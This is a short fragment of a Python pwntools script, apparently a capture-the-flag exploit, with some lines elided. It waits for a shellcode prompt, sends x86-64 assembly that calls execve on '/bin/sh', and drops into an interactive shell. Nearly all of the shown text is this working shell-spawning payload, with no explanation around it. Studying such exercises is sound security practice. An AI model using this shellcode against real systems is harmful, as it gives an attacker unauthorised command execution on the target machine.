from pwn import *

# ...
p.recvuntil(b'shellcode:')

assembly = '''
    mov rax, 59 /* execve */
    lea rdi, [rip + binsh]
    mov rsi, 0  /* <arg> */
    mov rdx, 0  /* <envp> */
    syscall

    binsh:
    .string "/bin/sh"
'''
# ...

# ...
p.interactive()
